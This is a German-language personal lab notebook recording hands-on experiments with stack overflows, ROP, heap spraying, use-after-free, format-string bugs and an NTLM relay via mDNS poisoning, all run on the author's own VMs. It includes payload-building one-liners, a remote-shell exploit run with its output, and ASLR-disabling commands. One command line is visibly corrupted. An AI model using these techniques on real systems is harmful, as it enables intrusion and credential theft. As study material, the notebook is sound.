# Verschiedene Arten von Exploits


### 21.11.2020
Einfachen Stack Overflow mit fester Stack-Adresse nachvollzogen.

Ausführen ohne ASLR: `setarch $(uname -m) -R bash`

    consti@debian: ~/Programmieren/Wurm $ python3 -c 'import struct, sys; code = open(sys.argv[1], "rb").read(); sys.stdout.buffer.write(b"........" + code + b"\x90" * (int(sys.argv[2]) - len(code)) + struct.pack("<Q", int(sys.argv[3], 16) + 8) + b"\n")' hello.bin 64 0x7fffffffe9d0 | ./victimd
    calling fgets() with wrong buffer size
    leaving main()
    hello, worldconsti@debian: ~/Programmieren/Wurm $ echo $?
    99

Interessanterweise ist die Startadresse von `buffer` (das 3. Argument oben) anders wen man `victimd` unter dem GDB laufen lässt. Man muss sich also die Adresse von `victimd` selber ausgeben lassen.

Debugger starten mit `tmux -CCu` und `LC_ALL=en_US.UTF-8 PYTHONIOENCODING=UTF-8 gdb --args ./victimd`


### 22.11.2020
Stack Overflow mit JMP RSP nachvollzogen

Instruktionen mit Keystone codieren: `LD_LIBRARY_PATH=/usr/local/lib/python3.8/dist-packages/usr/lib/python3/dist-packages/keystone python3.8 -c 'from keystone import *; ks = Ks(KS_ARCH_X86, KS_MODE_64); code, _ = ks.asm("jmp rsp"); print(bytes(code))'`

Mit pwndbg nach JMP RSP im Code suchen: `search -xe ffe4`. Eine der gefundenen Adressen muss man dann als Argument für `remsh.py` angeben. `victimd` muss mit `socat` gestartet werden, damit er über das Netz erreichbar ist.

    $ socat tcp-l:9999,reuseaddr exec:./victimd

    $ ./remsh.py -m jmp-rsp -s 64 -a 0x55555555607b -f shell.bin
    press any key to start exploit...
    > id
    uid=1000(consti) gid=1000(consti) groups=1000(consti),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),108(netdev)

    > .

Auch wenn man mit GDB den laufenden Prozess (`victimd`) stoppt ist die Startadresse von `buffer` anders / falsch.


### 23.11.2020
Die Startadresse von `buffer` wird von GDB beim Stoppen des laufenden Prozesses nur dann richtig ausgegeben wenn man sich in `main()` von `victimd` befindet. Das kommt daher, dass in den Debug-Infos die Adressen von lokalen Variablen (logischerweise) relativ zu RBP angegeben sind. Man muss sich also in dem Stack Frame befinden, in dem sie deklariert sind.

Erster Versuch in Richtung ROP: Ich habe in `hello.s` die Instruktion `mov rdx, 13` (Pufferlänge für `write`) weggelassen. Dafür wird die Rücksprungadresse jetzt mit der Adresse des ROP Gadgets `pop rdx; ret` überschrieben. Danach kommt der Wert für RDX (5 statt 13), danach die Adresse des Gadgets `jmp rsp` und dann der Code. Jetzt wird nur noch "hello" statt "hello, world" ausgegeben.

    consti@debian: ~/Programmieren/Wurm $ python3 -c 'import struct, sys; code = open("hello.bin", "rb").redout.buffer.write(b"." * 72 + struct.pack("<Q", int("0x7ffff7e030fa", 16)) + b"\x05\x00\x00\x00\x00\x00\x00\x00" + struct.pack("<Q", int("0x555555556093", 16)) + code + b"\n")' | ./victimd
    address of buffer: 0x7fffffffe9c0
    calling fgets() with wrong buffer size
    leaving main()
    helloconsti@debian: ~/Programmieren/Wurm $ echo $?
    99

[Ropper](https://github.com/sashs/Ropper) findet Instruktionen / Gadgets anscheinend nur in Code-Segmenten. Er findet `jmp rsp` weder in `victimd` noch in `libc`, PwnDbg aber schon. Und die gefundenen Stellen lassen sich auch ausführen. Das liegt daran, dass die Fundstellen in Datensegmenten liegen und die GCC-Option `-z execstack` macht nicht nur den Stack sondern auch alle Datensegmente (auch von den Bibliotheken) ausführbar.

Weiteres Vorgehen: Mit Ropper benötigte Gadgets in `victimd` und `libc` suchen und zu den Adressen die jeweiligen Basisadressen der Code-Segmente addieren (die sind ja fest weil ASLR ausgeschaltet ist).

Interessanter Artikel: https://trustfoundry.net/basic-rop-techniques-and-tricks/


### 24.11.2020
Die Offsets, die Ropper für die Gadgets ausgibt, zählen anscheinend ab der Startadresse des ersten Mappings, auch wenn die Adresse (Startadresse + Offset) dann im zweiten, dem ausführbaren Mapping liegt.


### 01.12.2020
Heap Spraying ist eine Methode, um die Payload zu übertragen und an einer festen Adresse (bei jedem Angriff die gleiche) auf dem Heap abzulegen. Die Methode beruht darauf, dass bei genügend vielen Allokationen einer bestimmten Grösse bestimmte Adressen immer verwendet werden. 

Payload kann Shellcode (wenn der Heap ausführbar ist) oder eine ROP Chain sein. Zusätzlich braucht es immer noch einen Exploit (Buffer Overflow, Use After Free...), um RIP auf den Heap bzw. eine auf dem Heap abgelegte Adresse umzubiegen. Bei einer ROP Chain führt eines der ersten Gadgets üblicherweise einen Stack Pivot durch, so das dann RSP auf die Chain auf dem Heap zeigt. Danach wird dann oft VirtualProtect() / mprotect() aufgerufen, um einen Bereich des Heaps ausführbar zu machen. Dort kann man dann normalen Shellcode ablegen.

Gute Artikel:
* https://nakedsecurity.sophos.com/2013/10/25/anatomy-of-an-exploit-inside-the-cve-2013-3893-internet-explorer-zero-day-part-2/
* https://www.corelan.be/index.php/2011/12/31/exploit-writing-tutorial-part-11-heap-spraying-demystified/


### 08.03.2021
Heap Spraying ist im oben genannten Sinn nur bei 32-Bit-Programmen möglich (siehe Analyse in `analyze-addresses.ipynb`). Bei 64-Bit-Programmen ist im allgemeinen der mögliche Adressraum zu gross (1TB bei Windows?). In Sonderfällen ist der mögliche Adressraum allerdings doch kleiner weil z. B. das 64-Bit-Programm eine 32-Bit-Bibliothek verwendet, oder eine Bibliothek ohne ASLR, oder Allokationen nutzen nicht den vollen Adressraum aus (ist wohl manchmal bei Windows so) oder man kann die Adresse von Objekten irgendwie ermitteln (siehe z. B. https://googleprojectzero.blogspot.com/2015/06/dude-wheres-my-heap.html).

Use-after-free Bugs (UAF) lassen sich dann dazu nutzen, beliebigen Code auszuführen, wenn in dem freigegebenen Objekt eine Code-Adresse gespeichert war. Ein Beispiel dafür ist die Virtual Table eines Objekts in C++. Voraussetzung für einen Exploit ist ausserdem, dass zwischen dem Freigeben und dem erneuten (unerlaubten) Nutzen des Objekts eine Allokation stattfindet, die den gleichen Speicherblock nutzt. Dieser Speicherblock muss vom Angreifer beschrieben werden können. Ein Beispiel dafür ist das Erzeugen eines Strings (der dann den Shellcode oder die ROP Chain enthält) in einem Interpreter, z. B. für Javascript (siehe https://reverseengineering.stackexchange.com/questions/4748/use-after-free-example). Evtl. könnte man so einen Exploit in [tiny-js](https://github.com/gfwilliams/tiny-js) nachstellen.


### 15.03.2021
Beispielprogramm für UAF mit Überschreiben der Virtual Table: `uaf-vtable-overwrite.cpp`


### 28.03.2021
Format-String-Exploits basieren darauf, dass ein vom Angreifer kontrollierter String als Format-String für eine Funktion wie `printf` benutzt wird. Mit dem Specifier `%n` lassen sich im Prinzip beliebige Adressen (z. B. Einträge in der GOT) mit beliebigen Werten überschreiben. Gute Beschreibung: https://codearcana.com/posts/2013/05/02/introduction-to-format-string-exploits.html, funktioniert so allerdings nur mit 32-Bit-Programmen ohne DEP und ASLR.


### 09.01.2023
Ein gutes Beispiel für UAF mit Überschreiben der Virtual Table wäre wahrscheinlich `snmpget.cxx`. Man könnte einen Bug einbauen, wo das Request-Objekt freigeben wird, das Response-Objekt den gleichen Speicherbereich überschreibt und dann das Request-Objekt nochmal verwendet wird. Evtl. müsste man die Objekte etwas anpassen, damit sie die gleiche Grösse haben. Für den Code könnte man ROP nutzen.

Siehe auch http://www.phreedom.org/research/exploits/asn1-bitstring/


### 28.01.2023
Mit dem Response-Objekt in `snmpget.cxx` lässt sich die Virtual Table doch nicht überschreiben weil die sich am Anfang eines Objekts befindet und den Aufbau des Response-Objekts kann ich ja nicht kontrollieren. Ausserdem wird der String, den ich für den Exploit verwenden würde, nicht in dem String-Objekt selber gespeichert, das Objekt enthält nur einen Zeiger auf einen Puffer. Ich müsste nach dem Freigeben des Request-Objekts an der gleichen Adresse einen Puffer (normales Array) allokieren.


### 12.03.2023
Heap Spraying mit `uaf-vtable-overwrite.cpp` nachvollzogen. Man muss allerdings erstmal die Anzahl der zufälligen Bits für die Startadressen, die `mmap` verwendet, von 8 (der Default) auf mindestens 12 erhöhen (zumindest in meiner Debian VM). Das geht mit `echo 14 > /proc/sys/vm/mmap_rnd_compat_bits` (siehe auch https://lwn.net/Articles/667790/).


### 06.08.2023
NTLM Relay nachvollzogen (würde vermutlich auch mit Kerberos funktionieren). Inspiriert durch https://googleprojectzero.blogspot.com/2021/10/using-kerberos-for-authentication-relay.html. Gute Beschreibungen sind https://en.hackndo.com/ntlm-relay/ und https://www.cynet.com/attack-techniques-hands-on/llmnr-nbt-ns-poisoning-and-credential-access-using-responder/.

Getestet habe ich mit folgendem Setup: Auf der 2. Windows-VM (win10-test) läuft der Web-Server, der SPNEGO-Authentifizierung (über SSPI) unterstützt (`http-server-with-sspi.py`). Auf der Linux-VM läuft der mDNS Poisoner (`mdsn-poisoner.py`) und der Relayer (`http-ntlm-relay.py`). Auf der 1. Windows-VM (win10-main) läuft der Browser (Edge), der den "bösen" Link aufruft. Alle VMs sind im selben Subnetz. 

Der Ablauf ist folgender:
1. Der Browser ruft die URL http://win10-test:8080/ auf.
2. Windows versucht den Namen _win10-test_ aufzulösen, über DNS, NetBIOS, LLMNR und mDNS.
3. Der mDNS Poisoner (läuft ja im gleichen Subnetz) gibt für den Namen die IP-Adresse der Linux-VM zurück, auf der ja auch der Relayer läuft.
4. Der Browser verbindet sich mit dem Relayer und authentifiziert sich (nutzt auch SSPI).
5. Der Relayer leitet die Authentifizierungsdaten des Browsers an den Web-Server weiter und die Antworten des Servers an den Browser. Damit authentifiziert er sich gegenüber dem Server und hat Zugriff.

Zwei Windows VMs braucht es weil Windows seinen eigenen Namen (logischerweise) nicht über mDNS aufzulösen versucht (also wenn Browser und Web-Server auf der gleichen VM laufen).

Man kann in der bösen URL auch nicht einfach die IP-Adresse des Relayers verwenden. Es muss zwingend der Hostname (oder die IP-Adresse, aber dann würde der Request ja gar nicht beim Relayer landen) der Windows-VM verwendet werden, auf der der Web-Server läuft. Das liegt daran, dass Edge den _Target Name_ auf den Hostnamen in der URL setzt und auf der Server-Seite SSPI diesen Namen gegen den eigenen Hostnamen prüft. Stimmen die beiden nicht überein schlägt die Authentifizierung fehl (und im Event Log gibt es eine Warnung vom LSA-Prozess). Mit `http-client-with-sspi.py` könnte ich einen beliebigen Target Name setzen, aber das ja nicht realistisch.